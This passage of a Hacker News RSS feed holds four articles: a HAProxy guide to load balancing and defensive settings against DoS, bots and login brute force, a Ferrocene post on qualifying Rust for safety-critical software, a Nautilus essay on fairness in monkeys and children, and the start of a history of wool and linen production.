            <pubDate>Fri, 05 Mar 2021 11:23:43 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[HAProxy – sysadmin’s swiss army knife]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=26355381">thread link</a>) | @dory1133
<br/>
March 5, 2021 | https://www.sysbee.net/devops-blog/haproxy-sysadmins-swiss-army-knife/ | <a href="https://web.archive.org/web/*/https://www.sysbee.net/devops-blog/haproxy-sysadmins-swiss-army-knife/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
					<h2>HAProxy – sysadmin’s swiss army knife</h2>
				

		<div>
			<div><div><div>
	<div>
		<p><a href="http://www.haproxy.org/"><strong>HAProxy </strong>i</a>s a free, open-source, high-performance <strong>TCP/HTTP load balancer</strong>. HAProxy has been around since 2001, it’s written in C programming language, and it uses an insignificant amount of memory and CPU resources, even with very advanced manipulations on HTTP traffic.</p>
	</div>
</div></div></div><div><div><div>
	<div>
		<p>It’s also very secure, having only fifteen security issues during the last seven years. Four of these issues were distribution-specific, six required a very high level of access (meaning the sysadmin maintaining the server would have a much bigger problem than HAProxy itself), and the last five were related mainly with denial of service attack vector.</p>
	</div>
</div></div></div><div><div><div>
	<div>
		<p>We at Sysbee absolutely love HAProxy. Besides the load balancing feature, we use it for mitigation of DOS attacks, traffic filtering, advanced HTTP request routing and throttling – you name it. Heck, we use it on single-server setups as well!</p>
	</div>
</div></div></div><div><div><div>
	<div>
		<div>
			<p>HAProxy supports load balancing of TCP (layer 4) and HTTP (layer 7) traffic with various load balancing algorithms – round-robin, static, by weight, cookie or header to name a few.</p>
<p><strong>TPC mode</strong> is faster, and it’s ideal for load balancing various protocols that rely on TCP, e.g. MySQL, SMTP, Redis, and even HTTP if we’re not interested in inspecting HTTP traffic itself.</p>
<p><strong>HTTP mode</strong> is a slower method compared to the TCP mode, however, the speed at which HAProxy performs analysis and manipulation of HTTP traffic is measured in single-digit milliseconds, so the term “slow” is fairly relative.</p>

		</div>
	</div>
</div></div></div><div><div><div><div data-hspacer="no_spacer" data-halign="left"><div>
<h3><span>DOS mitigation and traffic filtering</span></h3>
</div></div>
	<div>
		<p>In addition to load balancing, HAProxy has some interesting “party tricks” that can help mitigate some types of HTTP-based denial-of-service attacks and ensure server stability. Here are a few examples.</p>
	</div>
</div></div></div><div><div><div>
	<div>
		<div>
			<p>Slowloris attacks are a type of a DOS attack which allows a single machine to take down a web server with minimal bandwidth and side effects on unrelated services and ports. Slowloris tries to keep open as many connections to the target web server as possible, for as long as possible. It accomplishes this by opening connections to the target web server and sending a partial request, and then periodically sending subsequent HTTP headers, adding to, but never completing the request. Affected servers will keep these connections open, filling their maximum concurrent connection pool, eventually denying additional connection attempts from clients.</p>
<p>Threaded web servers are the most susceptible to such attacks (e.g. Apache, especially when using prefork multi-processing module). However, web servers with an asynchronous, event-driven architecture (where the request receives it in the background while other requests are processed) are also in peril of such an attack.</p>
<p>Mitigations are possible with the Apache mod_reqtimeout module, with Nginx limit connections per specific IP address and the like.</p>
<p>HAProxy is also event-driven, but with an intelligent protection mechanism.<br>To mitigate slowloris attacks, HAProxy only needs one directive – timeout http-request timeout – which defines the maximum accepted time to receive a complete HTTP request headers (without data).</p>
<p>We found that 10 seconds is low enough to keep the bad guys at bay and high enough to avoid terminated connections when the client has slow internet access.</p>

		</div>
	</div>

	<div>
		<div>
			<pre data-enlighter-language="dockerfile" data-enlighter-theme="" data-enlighter-highlight="" data-enlighter-linenumbers="" data-enlighter-lineoffset="" data-enlighter-title="" data-enlighter-group=""># Maximum time to receive complete HTTP request headers
timeout http-request 10s</pre>

		</div>
	</div>
</div></div></div><div><div><div>
	<div>
		<div>
			<p>It’s safe to say that we’ve all been in a situation where you need to filter a large number of requests based on the client’s IP address (e.g. when mitigating DDOS attack coming from specific subnets or countries).</p>
<p>So your question is probably “Why use HAProxy when you can use .htaccess or Nginx vhost?”.</p>
<p>The answer is pretty straightforward: HAProxy is much lighter in terms of CPU and memory, especially when it comes to filtering a large number of concurrent requests.</p>
<p>In the example below, we have an ACL called ”badguys”. HAProxy will try to match the visitor’s IP address for each HTTP request in the list of IP ranges in the badguys.txt file. To keep the list as small as possible, IP ranges are listed in CIDR notation.</p>

		</div>
	</div>

	<div>
		<div>
			<pre data-enlighter-language="dockerfile" data-enlighter-theme="" data-enlighter-highlight="" data-enlighter-linenumbers="" data-enlighter-lineoffset="" data-enlighter-title="" data-enlighter-group=""># Returns 403 error response if the request came from blacklisted IP
acl badguys src -f /etc/haproxy/badguys.txt
http-request deny if badguys</pre>

		</div>
	</div>
</div></div></div><div><div><div>
	<div>
		<div>
			<p>Similar to IP addresses, list files can be used to store other information. In this example, we want to block all requests with a specific string in the user-agent, except when the request was made to a specific domain.</p>
<p>Make sure to note the <strong>hdr_end</strong> directive, because it matches the end of the domain in the Host header. Depending on your use-case, you might want to match the value using alternative variables such as <strong>hdr_beg, hdr_sub</strong> or <strong>hdr_reg</strong>.</p>
<p>The exclamation point before the ACLs name indicates a negation. Also, bear in mind that HAProxy has a short-circuit evaluation of ACLs, which means the ACL evaluation will stop as soon as one of the conditions is not matched.</p>

		</div>
	</div>

	<div>
		<div>
			<pre data-enlighter-language="dockerfile" data-enlighter-theme="" data-enlighter-highlight="" data-enlighter-linenumbers="" data-enlighter-lineoffset="" data-enlighter-title="" data-enlighter-group=""># Returns 403 error if the request came with blacklisted user-agent header
acl badbot hdr_sub(User-Agent) -i -f /etc/haproxy/badbots.txt
acl excluded_domain hdr_end(Host) -i -f /etc/haproxy/exclude.txt
http-request deny if badbot !excluded_domain</pre>

		</div>
	</div>
<p><img alt="programmer immersed in code" src="https://www.sysbee.net/wp-content/uploads/2020/05/charles-deluvio-pjAH2Ax4uWk-unsplash-1140x445.jpg" data-oi="//www.sysbee.net/wp-content/uploads/2020/05/charles-deluvio-pjAH2Ax4uWk-unsplash-1140x445.jpg" width="t" height="t"></p></div></div></div><div><div><div><div data-hspacer="no_spacer" data-halign="left"><div>
<h4><span>Login brute-force prevention</span></h4>
</div></div>
	<div>
		<div>
			<p>HAProxy is very useful when it comes to filtering automated login and contact form attacks. In this example, we will concentrate on login forms.</p>
<p>For automated login attempts, bots/scripts usually attempt to send a single POST request to a specific URL. Smarter bots will try to imitate a legitimate user by sending a GET request beforehand, but to save bandwidth and time, they don’t load the entire login page with all the static resources.</p>
<p>To better understand the configuration example below, we’ll first explain specific configuration directives we mentioned in this example:</p>
<ul>
<li>The <strong>cookie insert</strong> directive in the backend instructs HAProxy to add an “SB_TRACK” cookie to HTTP response headers.</li>
<li><strong>indirect</strong> instructs HAProxy to insert the cookie if the client does not already have one</li>
<li><strong>nocache</strong> means that HAProxy will also add a “Cache-Control: nocache” response header so that the response is not accidentally cached between the client and HAProxy (e.g. if there is a caching server or a CDN node between them)</li>
<li><strong>bk_nocookie</strong> is a backend which points to the same web server, but HAProxy won’t add tracking cookie. Legitimate users will pick up a cookie by requesting any static resource that’s loaded from default <strong>bk_http</strong> backend.</li>
</ul>
<p>The logic behind it is straightforward – the idea is to block bots and malicious users who aim to send as many requests as possible and who will not collect tracking cookies.</p>
<p>Before submitting login credentials, users usually need to access a login page. In our example, legitimate users will pick up <strong>SB_TRACK</strong> cookie set by HAProxy when they access that login page and the collected cookie will later allow them to submit login credentials using POST HTTP method.</p>
<p>Bots and automated scripts in most cases are not bothered to accept cookies. They are easily blocked from submitting login requests by merely checking if their requests came with previously collected SB_TRACK cookie.</p>

		</div>
	</div>

	<div>
		<div>
			<pre data-enlighter-language="dockerfile" data-enlighter-theme="" data-enlighter-highlight="" data-enlighter-linenumbers="" data-enlighter-lineoffset="" data-enlighter-title="" data-enlighter-group="">frontend ft_http
...
    acl cms_cookie hdr_sub(cookie) SB_TRACK=c1
    acl cms_admin url_sub /wp-login.php
    acl cms_admin url_beg /admin/

    http-request deny if cms_admin METH_POST !cms_cookie

    use_backend bk_nocookie if cms_admin
    default_backend bk_http


backend bk_http
    cookie SB_TRACK insert indirect nocache
    server web1 192.168.10.10:80 cookie c1

backend bk_nocookie
   server web1 192.168.10.10:80
</pre>

		</div>
	</div>
</div></div></div><div><div><div><div data-hspacer="no_spacer" data-halign="left"><div>
<h4><span>Basic HTTP request throttling</span></h4>
</div></div>
	<div>
		<div>
			<p><span data-preserver-spaces="true">HAProxy is the ideal tool for getting the most out of a server that will be under increased load for a short period. Excellent examples of such occurrences are Black Friday promotions, holiday sales, and similar.&nbsp;</span></p>
<p><span data-preserver-spaces="true">In certain situations, the server can be rescued with the HAProxy queueing mechanism.</span></p>
<p><span data-preserver-spaces="true">In this example, the queueing policy is defined in the backend configuration section. Key directives are:</span></p>
<ul>
<li><span data-preserver-spaces="true"><strong>minconn</strong> – represents a concurrent number of connections to the backend server in calm conditions. All requests above the minconn limit will be queued.</span></li>
<li><span data-preserver-spaces="true"><strong>fullconn</strong> – specifies at what backend load the servers will reach their maxconn.</span></li>
<li><span data-preserver-spaces="true"><strong>maxconn</strong> – defines the concurrent number of connections to the backend server when fullconn limit is reached.</span></li>
</ul>

		</div>
	</div>

	<div>
		<div>
			<pre data-enlighter-language="dockerfile" data-enlighter-theme="" data-enlighter-highlight="" data-enlighter-linenumbers="" data-enlighter-lineoffset="" data-enlighter-title="" data-enlighter-group="">backend bk_http
    fullconn 100
    server web1 192.168.10.10:80 check inter 2s minconn 20 
maxconn 30
    server web2 192.168.10.20:80 check inter 2s minconn 20 maxconn 30
</pre>

		</div>
	</div>

	<div>
		<div>
			<p>In this example, we’ve set arbitrary “soft” and “hard” limits for a concurrent number of sessions which our backend servers can handle.</p>
<p>Each server will handle 20 concurrent sessions (defined with minconn). In case there’s a surge of requests, HAProxy will automatically queue those requests. If the number of queued requests exceed the fullconn limit (in our example 100 sessions), HAProxy will increase concurrency to 30 sessions per server (defined with maxconn) in effort to lower the number of queued requests.</p>
<p>Requests are queued until the <strong>timeout queue limit</strong> is reached (e.g., 60 seconds), during which time users will wait for the page to display in their browser.<br>If the timeout limit is reached, HAProxy will return a 504 gateway timeout error.</p>
<p>Use of the HAProxy queues makes sense only for short-term requests bursts because even if the minconn or maxconn limits are increased, the bottleneck will always be the processing speed of the backend servers.</p>

		</div>
	</div>
</div></div></div><div><div><div><div data-hspacer="no_spacer" data-halign="left"><div>
<h4><span>Advanced HTTP request throttling</span></h4>
</div></div>
	<div>
		<div>
			<p>Traffic throttling, as described in the previous example is applicable in certain situations (primarily if all requests are sent by legitimate users). But what if one or more malicious users send a large number of requests to the server and slow down the backend server for all other users?</p>
<p>Problematic …</p></div></div></div></div></div></div></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://www.sysbee.net/devops-blog/haproxy-sysadmins-swiss-army-knife/">https://www.sysbee.net/devops-blog/haproxy-sysadmins-swiss-army-knife/</a></em></p>]]>
            </description>
            <link>https://www.sysbee.net/devops-blog/haproxy-sysadmins-swiss-army-knife/</link>
            <guid isPermaLink="false">hacker-news-small-sites-26355381</guid>
            <pubDate>Fri, 05 Mar 2021 10:52:17 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Ferrocene Part 3: The Road to Rust in mission- and safety-critical]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=26355333">thread link</a>) | @lukastyrychtr
<br/>
March 5, 2021 | https://ferrous-systems.com/blog/ferrocene-update-three-the-road/ | <a href="https://web.archive.org/web/*/https://ferrous-systems.com/blog/ferrocene-update-three-the-road/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
<p><img src="https://ferrous-systems.com/images/ferrocene_logo_horizontal.svg" alt="The Ferrocene logo. A ball between two planes. The name ferrocene next to it."></p>



<p><i>To celebrate this announcement, we will be around at this years <a href="https://www.embedded-world.de/en/exhibitor-list">embedded world digital</a>. You can watch our pitch talk on Wednesday, March 3rd, from 11:10am - 11:20am CET (UTC+1).
We're available for 1:1 meetings all week.<p>

You can book those through the embedded world web application by searching for "Rust" or "Critical Section" in the exhibitors list.</p></i>
</p>

<p><i>We ran a Q&amp;A on YouTube Live on Monday, the recording can be watched <a href="https://www.youtube.com/watch?v=C3X-H4w5a7Q">here</a></i>
</p>

<p>Ferrocene is an effort led by Ferrous Systems and its newly formed subsidiary Critical Section GmbH to qualify the Rust Language and Compiler for use in the safety-critical domain. This is the third post in a series detailing our plans and actions around this effort, addressing topics discussed in <a href="https://ferrous-systems.com/blog/sealed-rust-the-pitch/">The Pitch</a> and <a href="https://ferrous-systems.com/blog/sealed-rust-the-plan/">The Plan</a>. Ferrocene's draft name was "Sealed Rust."</p>

<p>Our goal is to <strong>improve the status-quo of software quality and correctness in safety-critical domains</strong> by enabling the use of the Rust Programming Language for safety-critical software development. We believe that Rust is a significant improvement over existing tools both from a safety and quality perspective and as an improvement for developer productivity.</p>

<p>You can follow the progress on these efforts on the <a href="https://ferrous-systems.com/blog/">Ferrous Systems' Blog</a>, by <a href="https://eepurl.com/guoC6P">subscribing to our newsletter</a>, or by <a href="mailto:ferrocene@critical-section.com">contacting us directly</a>.
Ferrocene is currently looking for partner commitments! Please get in <a href="mailto:contact@critical-section.com">touch via email</a> if interested.</p>

<p>Since our last post in February 2020, we have moved Ferrocene from an idea to an actual project. We strengthened our contacts with interested companies and went deeper into our industrial and language research.</p>

<h2 id="finding-a-route-user-research">Finding a route: User Research</h2>

<p>Over the last 1.5 years, we have conducted several interviews with parties deploying software in safety-critical or mission-critical environments. The participants were diverse, from cloud providers to vehicle manufacturers. We found broad interest in adopting Rust in those industries.</p>

<p>There were several key takeaways:</p>

<ol>
  <li>Rust as a language is seen as the big contender in critical spaces. Particularly, its focus on rigor and stability is seen as a major competitive advantage.</li>
  <li>At the same time, language evolution and improvement speed is also a crucial factor of interest.</li>
  <li>There is a desire for improvement over current language specification practices.</li>
  <li>Rust only having one main compiler at the moment is seen as a strength at the current phase of the language.</li>
  <li>Interviewed organisations see the language on a good trajectory towards their needs.</li>
</ol>

<p>On further investigation, we found a lot of openness and desire for modern, tool-assisted specification and verification techniques. Rust was regarded as being on a good path and quoted as being a language that was already easier to analyze and inspect than other languages. For that reason, we researched existing practices.</p>

<p>In addition to the above, we overwhelmingly found that the projects and tools already providing analysis and further safety guarantees operate on <a href="https://blog.rust-lang.org/2016/04/19/MIR.html">MIR</a>, Rust's mid-level intermediate representation, and other IR rather than the Rust source language. They utilized MIR to carry program meaning in a simplified manner, enabling easier analysis and reasoning. As such, a desire expressed was visibility into changes to MIR and versioned stability.</p>

<p>When further interviewed on stability, organizations expressed a desire to adopt a technology that continually increases safety and assurance levels. Most organizations considered stability a consequence of structured, deliberate changes between documented milestones one can predictably target. We summed this up as "addressability". This framing resonated in interviewed organizations.</p>

<p>There was a high respect for Rust's software practices both inside and outside of the main project. It was mentioned as a strong point that many traditionally research-related tasks are conducted within the project.</p>

<p>In conclusion, there was a shared desire to produce safer, higher-quality software <strong>faster</strong> and a sense that <strong>fundamental changes are necessary</strong>.</p>

<h2 id="finding-an-orientation-why-ferrocene">Finding an orientation: why Ferrocene?</h2>

<p>A key question from these discussions with industry-leaders: what is Ferrocene, the product, and how does it relate to Rust? There was strong interest from potential clients that work that <em>can be</em> upstreamed into the Rust compiler <em>should be</em> wherever possible. We believe this points to a focus shift in the industry. Companies understand the value of FOSS as a neutral commons but also want to invest through initiatives that work towards their goals.</p>

<p>There are services required for mission and safety-critical industries that go beyond shipping a compiler. This includes (very) long-term support, qualification packages, industry-specific tooling, backends and targets, training, verification help and industry-specific advice. This is Ferrocene, the product.</p>

<p>During our conversations with industry leaders, we found that there's a need for Ferrocene as a wider initiative. Increasing the trust level of the Rust compiler will benefit many industries, and focusing only on typical safety-critical environments is one part of the picture. Improvements in the trust level of the core technology benefit <em>all</em> participants in the ecosystem. For example, we see efforts in better describing the semantics of Rust as it exists today as an important baseline for guiding the evolution of the language.</p>

<p>Ferrocene is both. It is a product to serve markets that need high assurances and committments. It is an initiative to take Rust to the next level of reliabilty and trust. Out of that comes a strong desire for collaboration.</p>

<h2 id="having-a-direction-first-waypoints">Having a direction: First Waypoints</h2>

<p>We intend to publish a solidified roadmap for Ferrocene by June 2021.</p>

<p>A major early milestone for Ferrocene is achievable criticality levels. Currently, we're aiming at ISO 26262/ASIL-B qualification readiness and general availability by the end of 2022. Along the way, we will work closely with early adopters to increase the toolchain's quality and gather feedback and experiences.</p>

<p>Ferrocene is a vehicle for a versioned Rust and MIR specification, paired with automated verification of Rust semantics. These "runnable specs" give developers in mission-critical and high-security environments a sound, proven, and addressable foundation for building critical libraries, analysis tools, and further system assurances.</p>

<p>Critical Section is also committed to improving the developer experience in mission and safety-critical industries. Ferrocene includes efforts to bring existing verification tools, like MIRI, to a production-ready state, while also improving the ease and advanced capabilities of formally verifying Rust programs.</p>

<h2 id="finding-partners-the-travel-group">Finding Partners: The travel group</h2>

<p>We have a lot of work ahead of us, but also a lot of experiences to tap into.</p>

<p>Ferrous Systems and Critical Section are calling for additional partners to join that effort! We're interested in partners from many industries, including:</p>

<ul>
  <li>Safety-critical sectors, such as automotive, railway and aerospace</li>
  <li>Operators of mission-critical infrastructure with high-reliability and security concerns, such as cloud vendors</li>
  <li>Hardware vendors</li>
  <li>Compiler vendors</li>
  <li>Organisations that require structured knowledge of their base systems</li>
  <li>Is interested in building strong, deep Rust knowledge now</li>
</ul>

<p>Partners also get early access to Ferrocene releases and can follow the development closely with engineer support.</p>

<p>If that describes your organisation, <a href="mailto:contact@critical-section.com">we're happy to be in touch</a>.</p>

<h2 id="starting-the-engine">Starting the engine</h2>

<p>In August 2020, Ferrous Systems GmbH created a wholly-owned subsidiary called Critical Section GmbH. Critical Section started work on Ferrocene in September 2020, setting up roadmaps, finalizing user research, and outreach to partners. Ferrocene is currently managed by Florian Gilcher and Sabree Blackmon.</p>

<h2 id="thanks">Thanks</h2>

<p>We would like to thank Tim Reed and Jack Greenbaum from Green Hills Software for their constant advice, guidance and collaborative experimentation along the way.</p>
</div></div>]]>
            </description>
            <link>https://ferrous-systems.com/blog/ferrocene-update-three-the-road/</link>
            <guid isPermaLink="false">hacker-news-small-sites-26355333</guid>
            <pubDate>Fri, 05 Mar 2021 10:45:06 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Was the Golden Rule Born in the Mind of a Monkey?]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 2 (<a href="https://news.ycombinator.com/item?id=26355201">thread link</a>) | @CapitalistCartr
<br/>
March 5, 2021 | http://m.nautil.us/blog/-was-the-golden-rule-born-in-the-mind-of-a-monkey | <a href="https://web.archive.org/web/*/http://m.nautil.us/blog/-was-the-golden-rule-born-in-the-mind-of-a-monkey">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
			

			<p><span><span>A</span>s economic inequality increased in many wealthy nations in recent years, a debate has developed around the question of whether inequality is bad for national economies—and bad for their citizens. A captivating video clip of monkey behavior</span>&nbsp;(see below)<span>, taken from </span><a href="http://www.ted.com/talks/frans_de_waal_do_animals_have_morals" target="_blank">a 2011 TED talk</a><span> by primatologist Frans de Waal, has become a surprising piece of ammunition in this discussion.</span></p><p><span>The video illustrates a famous 2003 </span><a href="http://www.nature.com/nature/journal/v425/n6955/abs/nature01963.html" target="_blank">experiment</a><span> by de Waal and his colleague Sarah Brosnan. It begins with a capuchin monkey being rewarded with a cucumber slice for handing a rock to the experimenter. The monkey happily performs this task and collects her payment—until the monkey next to her is given a more desirable reward, a grape, for the same job. The first monkey then flings the unappetizing cucumber from her cage. In the study, the monkeys often refused to hand over a rock if they saw the other monkey get grapes while they themselves continued to get cucumbers.</span></p> <iframe width="732" height="412" src="//www.youtube.com/embed/meiU6TxysCg" frameborder="0" allowfullscreen=""></iframe> <p><a href="http://nautil.us/issue/1/what-makes-you-so-special/the-cosmopolitan-ape" target="_blank">Frans de Waal</a> says that his research with primates shows that “instead of fairness and justice being intellectual products, something we have arrived at through reason, they are embedded in basic emotions, some of which are found in other primates,” possibly through a shared evolutionary history. “This is basically the [Occupy] Wall Street protest that you see here,” de Waal says at the end of the video clip. If his point about fairness is right, then arguments about inequality take on a biological imperative—greater equality can be seen as the “natural order” of things, and inequality as an inherently destructive force. As de Waal himself has argued in his&nbsp;<i>The Age of Empathy</i>, our capacity for building a stable society rests in part on knowing what kind of animals we humans are.</p><p><span>For a social-justice activist, the message from the monkeys may seem clear: Equal effort deserves equal pay, and any society that ignores this simple principle is messing with a deeply rooted instinct for fairness. But within the scientific world, far from settling the nature of fairness, Brosnan and de Waal’s classic study has prompted a stream of research that shows just how complex and fragile fairness can be in primate and human interactions.</span><br></p><p>If you watch the video of the capuchin monkeys (especially if it’s in the context of a blog post on income equality), it may seem obvious that the underpaid monkey is objecting to unfair treatment. But a sense of fairness may not be what’s driving the monkey’s behavior. Imagine that there was no second monkey in the experiment, just one monkey and an experimenter with a bowl full of cucumbers and another full of grapes. If the monkey were given the cucumber as a reward in that case, she might also object to it—not because it was unfair, but just because the cucumber doesn’t seem very appealing once the monkey knows there are grapes to be had. The monkey who rejects cucumbers may be less like a political protester and more like a two-year-old swatting away a proffered apple slice when a well-stocked candy jar is in full view.</p><p>To show that fairness is involved, the experiments need to demonstrate that monkeys are more reluctant to do the task when another monkey actually receives better payment, as compared with a situation in which the better reward is simply clearly visible. When such controls have been applied, the results of the studies have been mixed: Some primate species, like the highly social capuchin monkeys, do show sensitivity to social inequity, but chimpanzees generally seem less preoccupied with fairness.</p> <blockquote><p>“This is basically the [Occupy] Wall Street protest that you see here.”</p> </blockquote> <p>On the whole, evidence for fairness in other primates is much more limited than it is in adult humans. Monkeys and apes don’t reject an unequal distribution if the food is freely given rather than paid out in exchange for a task. In the lab, they generally act in their own interest when choosing how to dole out resources, while people are more likely to share equally with a partner. And they don’t turn down unequal offers in a task known as the “ultimatum game,” in which one partner decides how to divide up some resources and the other partner either accepts the offer or decides that neither partner will get anything. People often sacrifice resources in order to express contempt for an unequal offer, whereas chimps typically take what they can get, fair or not.</p><p>Experimental comparisons between humans and other animals are notoriously tricky, and there may be many reasons why primates don’t respond to unfairness in the particular ways that are measured in experiments. In some cases, the animals may have noticed an unequal outcome, but the experimental setup doesn’t offer the option for a useful response—and since they can’t verbally object to the injustice, we may never know how they really feel about it. In other cases, the experimental tasks may be so complicated that the animals fail to fully grasp their consequences. So while there’s some evidence that equity plays a role in animal behavior, scientists continue to debate whether this really shows that fairness is an instinct that we share with other animals.</p><p>Another way of approaching the question is to look at how fairness shapes the behavior of human children; a very early sensitivity to fairness would support the idea that it’s at least partly innate rather than entirely the product of cultural indoctrination.</p><div id="inpagesub">
	<p>Get the <span>Nautilus</span> newsletter</p>
<p>
	The newest and most popular articles delivered right to your inbox!
</p>
			<!-- Begin MailChimp Signup Form -->
			




</div> <p><span>And indeed, babies distinguish between fair and unfair behavior in others at a very young age. In a </span><a href="http://onlinelibrary.wiley.com/doi/10.1111/j.1467-7687.2011.01048.x/abstract?deniedAccessCustomisedMessage=&amp;userIsAuthenticated=false" target="_blank">study</a><span> by Alessandra Geraci and Luca Surian, 12- to 18-month-old babies watched short videos in which one “fair” animated character gave a toy to each of two other characters, while another “unfair” character handed two toys to a single character, leaving the other empty-handed. Afterwards the children were offered pictures of the fair and unfair characters and were told to pick one of them. Fourteen of 17 babies chose the fair character rather than the unfair one, suggesting that infants value fairness in others long before they’re capable of having conversations about morality and ethics.</span></p><p>But studies show that it takes a surprisingly long time for children to incorporate fairness into their own actions. Three- and 4-year-olds do readily object to an unequal distribution of resources if they’ve received the short end of the stick. But, like non-human primates, they rarely protest when they’re on the winning end of an unequal distribution. This makes it hard to know whether it’s <i>unfairness</i> that they dislike, or simply getting less than others.</p><blockquote><p>As children become aware of their social reputations, they start to behave in ways that they know are valued by others.</p> </blockquote><p><span>In fact, in deciding how to distribute resources, preschoolers strongly favor divisions in which they come out ahead of others; not only are they likely to claim more than their own share, they even show a spiteful tendency to </span><i>sacrifice</i><span> resources if it means that they can have more than someone else. A&nbsp;</span><a href="http://www.sciencedirect.com/science/article/pii/S0010027713002102" target="_blank">study</a><span> by Mark Sheskin and colleagues showed that when given a choice between allotting two prize tokens each to themselves and another child and claiming one for themselves while giving none to the other, 5- and 6-year-olds preferred the latter. If humans come predisposed to value fairness—and the study with young babies suggests that’s true—then it would appear that the abstract notion of fairness has to battle other, more self-serving impulses.</span><br></p><p>It’s not until closer to 8 years of age that children show a robust tendency to divide resources equally. And even then, they may be more concerned with <i>appearing</i> fair to others than with actually being fair. In <a href="http://dash.harvard.edu/bitstream/handle/1/10018932/shaw,et-al,gino,norton-children.pdf?sequence=1" target="_blank"></a><a href="https://www.hbs.edu/ris/Publication%20Files/shaw%20et%20al%202014_4fded5fb-0668-4025-9969-10f0ec36e2c3.pdf" target="_blank">study</a> led by Alex Shaw, children between 6 and 11 years of age had to decide how to allocate a nice prize and a lesser prize between themselves and another child. They were told that they could either just choose who got which prize, or they could flip a coin to determine the outcome. The older children (ages 9 to 11) chose to flip the coin 53 percent of the time, as opposed to 37 percent among the younger group. But when they were given the option to flip the coin in private and report the outcome, the “impartial” coin flip magically landed in their favor 62 percent of the time. This suggests that even for the older children, unfairness itself doesn’t necessarily cause distress—at least, not enough to make them give up the good prize. But as children become aware of their social reputations, they start to behave in ways that they know are valued by others.</p><p>As they approach adulthood, children show a steadily increasing tendency to distribute resources equally or even altruistically. But paradoxically, they may become less egalitarian in certain ways over the course of their development. Ernst Fehr and his colleagues <a href="http://www.econ.uzh.ch/faculty/fehr/publications/FehrRuetzlerSutterEERpublished.pdf" target="_blank">found</a> that children were more likely to deprive their peers of resources, even at a cost to themselves, if they were told that the other children came from a different school than if they were told that they belonged to the same school. This bias against members from a different group increased with age into the teen years, even though on the whole, teens were much less likely than younger kids to behave selfishly. In other words, they behaved more generously overall, but treated in-group and out-group members more unequally. For example, at ages 8 and 9, children made spiteful choices 41 percent of the time with in-group members and 44 percent of the time with out-group members, as compared with 17 versus 33 percent for 12- and 13-year-olds.</p><p>This growing body of research points toward conclusions that are much more nuanced than simply, “We are wired for equality.” Ultimately, <a href="https://nautil.us/issue/75/story/humans-are-wired-for-goodness" target="_blank">knowing what kind of animals we are</a> may help us better understand to what degree fairness is really an innate, primate value, as opposed to a product of our exceptional modern moment.</p><p><i>Julie Sedivy is a …</i></p></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="http://m.nautil.us/blog/-was-the-golden-rule-born-in-the-mind-of-a-monkey">http://m.nautil.us/blog/-was-the-golden-rule-born-in-the-mind-of-a-monkey</a></em></p>]]>
            </description>
            <link>http://m.nautil.us/blog/-was-the-golden-rule-born-in-the-mind-of-a-monkey</link>
            <guid isPermaLink="false">hacker-news-small-sites-26355201</guid>
            <pubDate>Fri, 05 Mar 2021 10:27:13 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Clothing, How Did They Make It? Part I: High Fiber]]>
            </title>
            <description>
<![CDATA[
Score 134 | Comments 11 (<a href="https://news.ycombinator.com/item?id=26355046">thread link</a>) | @CapitalistCartr
<br/>
March 5, 2021 | https://acoup.blog/2021/03/05/collections-clothing-how-did-they-make-it-part-i-high-fiber/ | <a href="https://web.archive.org/web/*/https://acoup.blog/2021/03/05/collections-clothing-how-did-they-make-it-part-i-high-fiber/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
		
<p>This week we are starting the first of a four (?) part look at pre-modern textile production.  As with our series on <a href="https://acoup.blog/2020/07/24/collections-bread-how-did-they-make-it-part-i-farmers/">farming </a>and <a href="https://acoup.blog/2020/09/18/collections-iron-how-did-they-make-it-part-i-mining/">iron</a>, we are going to follow the sequence of production from the growing of fibers all the way to the finished object, with a focus not merely on the methods of production but also <em>on the people doing the producing</em> at each stage of production.  Now while I have titled this series, “Clothing, How Did They Make It?” it is worth noting that textiles were used for a lot more than just clothing.  All sorts of household goods were produced this way.  In addition, of course, clothing was sometimes made out of non-textile materials (although, <a href="https://acoup.blog/2020/12/04/collections-that-dothraki-horde-part-i-barbarian-couture/">as we’ve discussed</a>, far less often than is portrayed in popular culture; in Eurasia, by and large, clothing meant textiles).  <strong>But what we are going to focus on here is really <em>textiles</em></strong> and (of course) the people that make them.  Leather working will have to wait for another day.</p>



<p>That said, even within textiles, to try to keep the scope manageable<strong> I am going to narrow things down further, by focusing on just two major fibers: wool and flax</strong> (which makes linen) and thus <strong>mostly focus on how this worked in the Mediterranean</strong>, broadly construed (so the Near East, North Africa and Europe).  I am choosing these two fibers because they dominate in locally produced textiles in the Near East and Europe for much of the pre-modern period.  Cotton, another important fiber, only seems to have been cultivated in Egypt in the Roman period (though, as far as I can tell, at some point Egyptian cotton cultivation seems to have largely dropped off, only to boom again in the Early Modern though this is a point about which I can express little confidence in my knowledge) and for much of Europe remained an expensive import fiber through the Middle Ages, transported from South Asia.  Likewise, silk remained in the pre-modern period almost entirely an expensive import good from far to the East of the Mediterranean.  Of course any import good must be local somewhere, but my expertise in pre-modern textile production does not extend so far into South or East Asia, so the task of laying that out must fall to someone else.  We will talk a <em>bit</em> about these fibers as they arrive in the Mediterranean as trade goods, but mostly stay focused on wool and flax.</p>



<p>The very rarity of these goods in the Near East and Europe confined them to the upper-classes, while wool and linen often remained the everyday fibers (though even the very wealthy used textiles of high quality wool and linen as well) and so saw a lot more use.  More importantly to our investigation here, for the ancient Mediterranean (where my knowledge is best) wool and linen were <em>by far</em> the fibers most involved in the household textile production.  Of course other fibers were used locally in the Mediterranean as well – hemp, nettle and even tree-bast, but the vast majority of<strong> textiles being produced in the broader Mediterranean world were wool and linen and so we are going to focus on that.</strong></p>



